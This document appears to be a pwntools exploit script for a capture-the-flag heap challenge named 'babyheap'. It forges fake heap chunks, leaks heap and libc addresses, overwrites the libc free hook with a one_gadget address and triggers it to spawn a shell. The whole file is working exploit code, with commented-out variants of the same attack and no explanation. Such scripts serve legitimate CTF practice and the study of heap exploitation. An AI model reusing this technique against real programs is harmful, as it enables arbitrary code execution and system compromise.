#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
#context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']

elf = context.binary = ELF('./babyheap')
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript=gs)
    elif args.REM:
        return remote("",)
    else:
        return process(elf.path)


io = start()

sl      = lambda s : io.sendline(s)
sa      = lambda delim,data : io.sendafter(str(delim), str(data))
sla     = lambda delim,data : io.sendlineafter(str(delim), str(data))
sn      = lambda s : io.send(s)
rc      = lambda n : io.recv(n)
rl      = lambda s : io.recvline(s)
#ru = lambda s : io.recvuntil(s)
ru      = lambda delim,drop=True : io.recvuntil(delim, drop)
uu32    = lambda data            : u32(data.ljust(4, '\x00'))
uu64    = lambda data            : u64(data.ljust(8, '\x00'))
lg      = lambda s,addr          : io.success('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
ti      = lambda : io.interactive()

def c(idx):
    sla("Choice:",idx)

def malloc(idx,content):
    c(1)
    sla("Index:",idx)
    sla("Content:",content)

def fill(idx,content):
    c(2)
    sla("Index:",idx)
    sla(":",content)

def show(idx):
    c(3)
    sla("Index:",idx)

def free(idx):
    c(4)
    sla("Index:",idx)


one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]

malloc(0,'AAAAAAAA')
malloc(1,'BBBBBBBB')
malloc(2,'CCCCCCCC')
malloc(3,'DDDDDDDD')


malloc(4, (p64(0)+p64(0x31)+p64(0x602080-0x18)+p32(0x602080-0x10)).decode("iso-8859-1") )
malloc(5, (p64(0x30)+p64(0x30)).decode("iso-8859-1") )



free(1)
free(0)

#leak heap addr
show(0)
heap_addr = u64(ru(b"\n").ljust(8,b'\x00')) - 0x30
lg("heap_addr:",heap_addr)

# # leak libc
# init_debug(p,breakpoint)
# raw_input('wait to debug')
fill(0, (p64(heap_addr+0x20)+p64(0)+p64(0)+p32(0x31)).decode("iso-8859-1") )

malloc(6, (p64(0)+p64(0xa1)).decode("iso-8859-1") )
malloc(7, (p64(0)+p64(0xa1)).decode("iso-8859-1") )


# leak libc
free(1)
show(1)
libc_address = u64(rc(8)[0:6].ljust(8,b'\x00'))-0x3c4b78
lg("libc:",libc_address)
fill(4,p64(libc_address + 0x3c67a8).decode("iso-8859-1"))
input()
fill(1, p64(libc_address + one_gadget[1]).decode("iso-8859-1"))

free(1)




#payload = p64(0)*3 + p32(0x31)
#malloc(0,payload.decode("iso-8859-1"))
#malloc(1,"AAAA")
#malloc(2,"AAAA")
#malloc(3,"AAAA")
#malloc(4,"AAAA")
#free(0)
#free(1)
#fill(1,p64(0x603020).decode("iso-8859-1"))
#malloc(5,"A")
#payload1 = p64(0)+p64(0x91)
#malloc(6,payload1.decode("iso-8859-1"))
#free(5)
#show(5)
#address = u64(rc(8)[0:6].ljust(8,b"\x00"))
#main_arena = address - 88
#libc.address = main_arena - 0x3c4b20
#lg("address",address)
#lg("libc",libc.address)
#fill(6,(p64(0)+p64(0x31)).decode("iso-8859-1"))


io.interactive()
